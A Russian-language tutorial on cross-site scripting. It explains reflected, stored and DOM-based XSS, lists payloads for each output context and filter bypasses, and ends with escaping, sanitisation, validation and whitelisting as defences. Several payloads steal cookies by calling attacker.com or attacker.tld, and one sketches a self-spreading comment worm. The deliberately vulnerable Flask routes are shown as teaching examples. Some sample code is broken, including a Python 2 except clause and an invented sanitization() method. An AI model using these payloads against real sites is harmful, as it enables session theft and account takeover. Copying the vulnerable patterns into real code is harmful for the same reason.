# Что такое межсайтовый скриптинг (XSS)
***XSS — это внедрение вредоносного кода на сайт, который выполняется в браузере других пользователей.***

`XSS` (Cross-Site Scripting) —  это уязвимость в системе веб-безопасности, которая позволяет злоумышленнику нарушить взаимодействие пользователей с уязвимым приложением. Уязвимости межсайтового скриптинга обычно позволяют злоумышленнику выдавать себя за пользователя, выполнять любые действия, доступные пользователю, и получать доступ к любым данным пользователя. Если у пользователя-жертвы есть привилегированный доступ в приложении, злоумышленник может получить полный контроль над всеми функциями и данными приложения.

## Основная цель XSS:
Заставить браузер пользователя выполнить код атакующего: украсть сессию/токен, подменить действия (например, отправить форму от лица жертвы), показать фишинговое окно, изменить контент страницы.

## Виды XSS
1. `Reflected` (отражённая) — полезная нагрузка приходит с запросом и тут же отражается в ответе. Злоумышленник отправляет жертве ссылку с вредоносным кодом внутри. Требует, чтобы жертва перешла по подготовленной ссылке или отправила форму.  
Пример по ссылке: `https://site/?q=<script>alert(1)</script>`. Код выполнится в браузере жертвы.
2. `Stored` (хранимая) — полезная нагрузка сохраняется на сервере (комментарии, профили, отзывы) и выполняется при просмотре страницы другими пользователями. Самая опасная — масштабная «доставка» payload’а.  
Пример в поле «bio»: `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`
3. `DOM-based` — уязвимость целиком на клиенте: сервер может не вставлять ничего «опасного», но скрипты на странице берут данные из location, referrer и небезопасно вставляют в DOM.
Пример: `container.innerHTML = location.hash`  
Атака происходит прямо в браузере жертвы — код меняет содержимое страницы через JavaScript, не затрагивая сервер. Например, скрипт может подменить форму входа и отправить введённые данные злоумышленнику.

## Чем опасен XSS — реальные последствия
1. `Кража сессий`: если сессионные токены доступны в JS (не включен `HttpOnly`), можно их украсть и залогиниться как жертва.
2. `Фишинг внутри доверенного UI`: подмена формы/диалога, ввод пользователя будет перехвачен.
3. `Действия от имени пользователя`: перевод, постинг, смена настроек — CSRF-подобные сценарии через JS.
4. `Эскалация через админские интерфейсы`: выполненный payload от админа = полный контроль над приложением.

## Что такое Reflected XSS
`Reflected XSS` — это XSS, при котором вредоносная нагрузка приходит с запросом (URL, форма, заголовок) и сразу отражается в ответе сервера без должного экранирования. Жертва получает ссылку / форму / письмо, кликает — и браузер исполняет чужой JS в контексте сайта. Такой XSS `не хранится на сервере — он возвращается сразу обратно`.

Ключевая деталь: payload путешествует `вместе с запросом`, поэтому атаке нужна «доставка» (ссылка, фишинговое письмо).

Пример:
1. Сценарий. На сайте есть страница поиска. Она берёт текст из параметра в адресной строке и сразу показывает его на странице: «Вы искали: …».
Запрос:
```
/search?q=phone
```
HTML:
```html
<h1>Search results</h1>
<p>You searched for: phone</p>
```
Ввод пользователя (q) просто вставляется в HTML

2. Как атакуют. Злоумышленник делает специальную ссылку на эту страницу, где вместо обычного текста в параметре — вредный фрагмент (скрипт). Эту ссылку он присылает жертве по почте/в мессенджере.  
Атакующий подставляет JS-код вместо текста:
```js
/search?q=<script>alert(1)</script>
```
3. Что делает жертва. Кликает по ссылке и открывает страницу поиска. Сайт автоматически «отражает» содержимое параметра обратно в страницу.  
Оно без фильтрации вставляет ввод:
```js
<p>You searched for: <script>alert(1)</script></p>
```
4. Что происходит. Вместо безобидной фразы выполняется вредный скрипт, но уже в браузере жертвы и от имени сайта.  
Браузер видит:
```js
<script>alert(1)</script>
```
И выполняет JS.  
Результат:
```
alert(1)
```
5. Чем это грозит. Кража сессии/токена, подмена интерфейса (фишинг), запуск действий от имени жертвы (например, смена почты в профиле).

***Кража cookie***
```http
/search?q=<script>fetch('https://attacker.com?c='+document.cookie)</script>
```
***Подмена интерфейса***
```http
/search?q=<script>document.body.innerHTML='Login expired. Enter password again'</script>
```
***Выполнение действий***
```htpp
/search?q=<script>fetch('/change-email?email=hacker@mail.com')</script>
```
Всё выполняется от имени пользователя

6. Почему получилось. Страница без экранирования вставила внешний ввод прямо в HTML и тем самым позволила выполнить код.  
Уязвимый код (например, backend):
```html
<p>You searched for: {{ q }}</p>
```
или:
```js
res.send("<p>You searched for: " + req.query.q + "</p>");
```
Нет экранирования → XSS

### Где Reflected XSS чаще всего встречается
* Поисковые строки и фильтры: `?q=`... — часто отражают введённое в результатах или в сообщении «Вы искали: …».
* Страницы ошибок/статуса, которые показывают неподходящий ввод.
* Формы (GET/POST), где ввод возвращается в ответ без сохранения.
* Redirect/forward сообщения (e.g. ?redirect=...) — если параметр подставляют в HTML/JS перед редиректом.
* Заголовки (например, Referer отображают в шаблоне отладки).

### Типичный рабочий PoC (пример)
***URL: `https://example.com/search?q=<script>alert(1)</script>`***
Если сайт в HTML отдаёт:
```html
<p>Вы искали: {{ q }}</p>
```
и не экранирует q, браузер отработает <script>alert(1)</script>.

***Контекст важен — какие минимальные PoC применять. Между тегами (text node)***  
PoC: `<img src=x onerror=alert(1)>`  
Применение: вставьте в параметр и проверьте вывод.

***В атрибуте***  
PoC: `" onmouseover=alert(1) x="` (закрываем кавычку)  
Применение: если значение попадает в `href`, `title`, `value` и т.п.  
HTML:
```html
<input value="USER_INPUT">
```
Payload:
```html
" onfocus="alert(1)
```
Итог:
```html
<input value="" onfocus="alert(1)">
```

***В JS-строке***  
PoC: `");alert(1);//`  
Применение: если значение вставляют внутри <script>var s = '...';</script>.  
Внутри JavaScript:
```html
<script>
var q = 'USER_INPUT';
</script>
```
Payload:
```js
';alert(1);//
```
Итог:
```js
var q = '';alert(1);//';
```

***URL / scheme***  
PoC: `javascript:alert(1)` (требует клика)  
Применение: в href/src если не фильтруют схемы.  
HTML:
```html
<a href="USER_INPUT">Click</a>
```
Payload:
```html
javascript:alert(1)
```

### Частые обходы фильтров и способы реагировать
1. Фильтрация `</>` (простое HTML-экранирование)  
```python
q = q.replace("<script>", "")
```
Обходы: `SVG (<svg onload=...>)`, вставка в атрибуты, использование `onerror` в img, data: URI.  
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```
Что делать dev: контекстное экранирование (HTML-encode) — это первично.

2. Запрет `script/on*`  
```python
if "onerror" in q:
    block()
```
Обходы: события в SVG (onload), нестандартные вендор-атрибуты, `<iframe srcdoc>`, полиглоты.  
```html
<svg onload=alert(1)>
```
или
```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```
Что делать dev: `whitelist` тегов/атрибутов (DOMPurify/bleach), удалять все `on*` атрибуты.

3. Блокировка `javascript`: схемы  
```python
if "javascript:" in url:
    block()
```
Обходы: `href="data:text/html;base64,..."` или создание клика через JS.  
```html
<a href="data:text/html,<script>alert(1)</script>">
```
Что делать dev: проверять схемы ссылок и запрещать javascript:/data: там, где не нужны.
4. `Double / URL encoding`  
Обходы: двойное кодирование `%253C` и т. п.  
```text
%253Cscript%253Ealert(1)%253C/script%253E
```
сервер декодирует дважды → XSS  
Что делать dev: правильно декодировать и применять проверки после декодирования; canonicalize + validate.

Многие сайты фильтруют `<script>`, но забывают про:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

###  Python (Flask, уязвимо)
```python
from flask import Flask, request
app = Flask(__name__)
@app.route("/search")
def search():
    q = request.args.get("q")
    return f"<p>You searched for: {q}</p>"   # ❌ XSS
```

## Stored XSS
`Stored XSS` — это когда вредоносная полезная нагрузка записывается на сервер (в комментарий, профиль, отзыв, лог и т. п.) и затем исполняется в браузере каждого пользователя, который просматривает страницу с этим содержимым. В отличие от reflected XSS, здесь злоумышленнику не нужно заставлять каждую жертву перейти по ссылке: достаточно добавить payload, и он автоматически попадёт к посетителям (включая админов).

### Пример
1. Сценарий. На сайте есть «профиль» и «комментарии». Всё, что пользователь пишет в описании профиля и в комментариях, сохраняется в базу и потом показывается всем на страницах.  
Обычный пользователь отправляет форму:
```http
POST /profile
bio=I love programming
```
SQL (условно)
```sql
INSERT INTO users (bio) VALUES ('I love programming');
```
HTML:
```html
<h2>About me</h2>
<p>I love programming</p>
```
Всё нормально

2. Как атакуют. Злоумышленник в поле «Описание профиля» вместо обычного текста сохраняет вредный фрагмент (скрипт):
```http
POST /profile
bio=<script>alert(1)</script>
```
В базе сохраняется:
```
<script>alert(1)</script>
```
3. Что делает жертва. Любой пользователь (или модератор) открывает страницу профиля злоумышленника или ленту, где показываются его комментарии.  
Любой пользователь открывает профиль:
```http
GET /profile?id=123
```
HTML страницы:
```html
<h2>About me</h2>
<p><script>alert(1)</script></p>
```
4. Что происходит. Сайт выводит сохранённый текст как HTML, без экранирования. Сохранённый ранее скрипт автоматически выполняется в браузере каждого, кто открыл страницу — снова от имени сайта.

5. Чем это грозит. Массовое заражение: кража сессий, подмена интерфейса, автодействия от имени пользователей (например, отправка личных сообщений, смена настроек), распространение дальше — скрипт может автоматически публиковать новые «заражённые» записи.
***Массовая кража cookie***
```html
<script>
fetch('https://attacker.com?c=' + document.cookie)
</script>
```
каждый пользователь отправит cookie атакующему

***Самораспространение (worm)***
```html
<script>
fetch('/comment', {
  method: 'POST',
  body: 'text=<script>...</script>'
});
</script>
```
заражает других пользователей

***Действия от имени пользователя***
```html
<script>
fetch('/change-email', {
  method: 'POST',
  body: 'email=hacker@mail.com'
});
</script>
```

***Фишинг прямо внутри сайта***
```html
<script>
document.body.innerHTML = `
<h1>Session expired</h1>
<input placeholder="Password">
`;
</script>
```

6. Почему получилось. Приложение сохраняет пользовательский ввод «как есть» и потом вставляет его в HTML без проверки и экранирования. В отличие от reflected XSS, здесь вредный код ждёт в базе и срабатывает у каждого зрителя.

### Почему это особенно опасно
1. Массовая экспозиция: payload видят все посетители страницы.
2. Долговечность: уязвимость может жить месяцами — каждый новый просмотр выполняет скрипт
3. Возможности: помимо кражи сессий — автоматические действия от лица пользователей, взлом админских панелей.

### Где обычно хранятся полезные нагрузки
* Комментарии/фиды (блоги, форумы, товары) — классика.
* Поля профиля: display name, bio, avatar URL, статус.
* Отзывы/оценки, описания товаров.
* Сообщения в чате/вики/базах знаний.
* Поля админских форм (notes, reason, description), которые видит ограниченный круг — особенно опасно.
* Логи/записи аудита, если их потом отображают в админке.
* Импорт данных (CSV/Excel) — если импорт идёт «как есть» в HTML.

### Простой PoC
***Поле «комментарий» принимает HTML и сохраняет без фильтра.***  
Комментарий: `<img src=x onerror="fetch('https://attacker.tld/?c='+btoa(document.cookie))">`  
Любой пользователь, открывший страницу с этим комментарием, отправит cookie на атакующий домен.

***Контекст вывода в Stored XSS*** — что важно смотреть  
`Stored payload` может попасть в любой из контекстов (между тегами, в атрибут, в JS, в URL, в CSS). Для успешной эксплуатации надо понять:
* Где именно в шаблоне выводится сохранённое поле.
* Выполняется ли оно как HTML (через `innerHTML`) или как `textContent`.
* Выполняется ли код при загрузке сразу (onload/onerror/onmouseenter) или только при действии (клик/фокус).
* Видят ли страницу админы/пользователи/роботы (scope).

***Payload-паттерны для Stored XSS***  
Эти короткие примеры — для проверки/демки. Для реальной эксплуатации используют более сложные полезные нагрузки.

***HTML-контекст***
```html
<p>USER_INPUT</p>
```
Payload:
```html
<script>alert(1)</script>
```

***Между тегами*** (текстовая вставка):
`<img src=x onerror="new Image().src='https://attacker.tld/?c='+btoa(document.cookie)">`

Иногда комментарии рендерятся как HTML:
```html
<div class="comment">
  USER_INPUT
</div>
```
тогда можно использовать:
```html
<img src=x onerror=alert(1)>
```

***В атрибуте*** (value/title/href):
`" onmouseover="new Image().src='https://attacker.tld/?c='+btoa(document.cookie)" x="`
```html
<img alt="USER_INPUT">
```
Payload:
```html
" onerror="alert(1)
```
Итог:
```html
<img alt="" onerror="alert(1)">
```

***В JS-строке*** (если поле вставляют в скрипт):
`');fetch('https://attacker.tld/?c='+btoa(document.cookie));//`
```html
<script>
var bio = 'USER_INPUT';
</script>
```
Payload:
```js
';alert(1);//
```
Итог:
```js
var bio = '';alert(1);//';
```

### Особые приёмы для эксплуатации stored XSS
* Автозапуск через события: вставить атрибут, который исполнится автоматически (`onerror`, `onload`, `onmouseover` на скрытом элементе).
* Сборка payload на клиенте: записать «безопасный» кусок в базу и на клиенте собрать полноценный скрипт (полезно при фильтрации символов).
* Скрытые `iframes` / `iframe srcdoc`: вставить `iframe srcdoc="...payload..."`.
* Использование админских просмотров: иногда админские страницы показывают raw HTML (например, лог ошибок) — особенно ценно.
* Комбинация CSRF и XSS: XSS запускает запрос к внутреннему API с авторизацией жертвы.

## DOM-based XSS.
Здесь уязвимость вообще может не быть на сервере — всё происходит в браузере.

1. Есть страница, где JS берёт данные из URL и вставляет в DOM:
```html
<div id="output"></div>
<script>
  const q = new URLSearchParams(window.location.search).get('q');
  document.getElementById('output').innerHTML = q;
</script>
```
Есть параметр в URL. Обычный пользователь
```http
/page?q=hello
```
Что делает JS:
```js
q = "hello"
```
HTML:
```html
<div id="output">hello</div>
```
всё нормально

2. Что делает атакующий  
Подставляет payload:
```http
/page?q=<script>alert(1)</script>
```

3. Что делает браузер  
JS вставляет:
```js
innerHTML = "<script>alert(1)</script>"
```
Итоговый DOM:
```html
<div id="output">
  <script>alert(1)</script>
</div>
```
4. Что происходит  
Браузер выполняет:
```js
alert(1)
```
5. Почему это `DOM XSS` - сервер вообще не участвовал:
* сервер отдал обычную страницу
* JS сам вставил вредный код

6. Основные источники (sources), откуда берутся данные:
* location.search
* location.hash
* document.URL
* document.referrer

####  Опасные места (sinks) - куда вставляют данные:
* innerHTML:
`element.innerHTML = user_input;`  
Payload:
```html
<img src=x onerror=alert(1)>
```
* document.write():
`document.write(user_input);`  
Payload:
```html
<script>alert(1)</script>
```
* outerHTML
* eval():
`eval(user_input);`  
Payload:
```js
alert(1)
```
* setTimeout():
`setTimeout(user_input, 1000);`
Payload:
```js
alert(1)
```
* location (редкий, но важный)
`window.location = user_input;`  
Payload:
```text
javascript:alert(1)
```
XSS = source → sink без фильтрации

# Разница всех XSS
| Тип       | Где payload     |
| --------- | --------------- |
| Reflected | в URL           |
| Stored    | в базе          |
| DOM       | в браузере (JS) |

***DOM XSS = это не backend, это JavaScript логика***

## Базовые меры защиты
Итак, мы рассмотрели разные XSS-уязвимости и разобрались в том, как их искать. Сейчас поговорим о том, как защищаться от XSS.

### Популярные и эффективные методы защиты от XSS:
* санитизация;
* энкодинг;
* белый список;
* валидация.

### 1. Санитизация — деактивируем символы ввода
`Санитизация` — удаление небезопасных символов из пользовательского ввода. Она должна производиться перед отправкой данных на сервер, на этапе обработки пользовательского ввода. Запрос нужно очистить от опасных символов — `@, <, >, ', ", \`. Санитизация должна проводиться после нормализации.

### Python (bleach)
```python
import bleach
clean = bleach.clean(
    user_input,
    tags=["b", "i", "u"],
    attributes={},
    strip=True
)
```
### Было
```html
<script>alert(1)</script>
```
### Стало
```html
alert(1)
```

`Нормализация данных` — приведение введённых данных к стандарту или формату. Цель нормализации — обеспечить единообразие данных и устранение аномалий или неправильных значений во введённых данных.

Например, данные могут прийти в виде `user_input = "%3Cscript%3Ealert%2811%29%3C%2Fscript%3E"`. Их нужно нормализовать, чтобы скрипт не исполнялся на сервере или странице. Для этого используется функция `urldecode`. Она обрабатывает данные пользовательского ввода и убирает все кодировки — `user_input= urldecode(user_input)`.

Пример корректной обработки пользовательского ввода:
```js
sanitized_string= user_input.normalize().sanitization() 
```
Здесь:  
***normalize()*** — приводит пользовательский ввод к единому виду;  
***sanitization()*** — санитизирует пользовательский ввод, то есть удаляет все недопустимые символы.

### 2. Валидация
`2. Валидация` — фильтруем нестандартный ввод. `Валидация` — оценка данных пользовательского ввода на соответствие контексту.

Например, есть графа «возраст», и веб-приложение ожидает увидеть там только цифры. Если пользователь попробует ввести буквы или специальные символы, то приложение не должно пропустить такой ввод.

Проверка должна осуществляться как на клиентской части приложения, так и на серверной. Это сделает ввод вредоносной нагрузки в поле невозможной.

Пример валидации на Python:
```python
try:
age = int(user_input)
except Exception, e:
decline user_input flow 
```

### Python
```python
import re

if not re.match(r"^[a-zA-Z0-9\s]+$", user_input):
    return "Invalid input"
```
только безопасные символы

## 3. Энкодинг — удаляем опасные символы
`Энкодинг` — процесс преобразования данных из одного формата в другой. Энкодинг нужно проводить перед тем, как пользовательские данные попадут на страницу в HTTP-ответе.

Потенциальную опасность несут HTML-символы `", <, >, & и '`. Они могут привести к исполнению вредоносного кода. Перед отправкой данных они заменяются на `&qout`, `&lt`, `&gt`, `&amp`, `&#39` соответственно.

Данные, которые передаются в адресной строке браузера, по умолчанию отправляют в кодировке URL Encode. Символы `", <, >, & и '` заменяются на `%22`, `%3C`, `%3E`, `%26` и `%27`.

### Python (Flask — безопасно)
```python
from flask import escape
@app.route("/search")
def search():
    q = request.args.get("q")
    return f"<p>You searched for: {escape(q)}</p>"
```
### HTML
```html
<p>You searched for: &lt;script&gt;alert(1)&lt;/script&gt;</p>
```
👉 скрипт не выполняется

## 4. Белый список — пропускаем только нужное
`Белый список` — список разрешённых для ввода тегов и атрибутов. Иногда разработчики не могут отказаться от HTML-разметки, подконтрольной пользователю, из-за требований бизнеса.

Белый список не всегда поможет защититься от XSS-эксплоита, так как злоумышленники могут найти комбинацию разрешённых тегов. Например, мы ограничили белый список тегов `<a>`, `<b>`, `<h1>` и разрешили атрибут `href` для удобной навигации по сайту.

Кажется, что всё выглядит безобидно, но это не так. Злоумышленник может использовать JavaScript-протокол, для исполнения своего вредоносного кода. Вот как выглядит PoC: `<a href="javascript:alert(1)">SomeText</a>`.

Использовать белый список тегов и атрибутов рекомендуется только в случае острой необходимости. Также не стоит использовать самописные проверки — используй проверенные и популярные библиотеки.

`Санитизацию`, `валидацию`, `энкодинг` и `белый список` следует применять совместно — так эффективность защиты повышается. Однако стоит внимательно отнестись ко всем местам веб-приложения, где пользователь может вводить данные: от Ф. И. О. до комментариев в чате поддержки. Если оставить точки ввода без защиты, то ни один из четырёх способов не сработает.

### Python
```python
allowed_tags = ["b", "i", "a"]
clean = bleach.clean(
    user_input,
    tags=allowed_tags,
    attributes={"a": ["href"]},
)
```
### Запрещается автоматически:
```html
<script>
<img onerror=...>
```
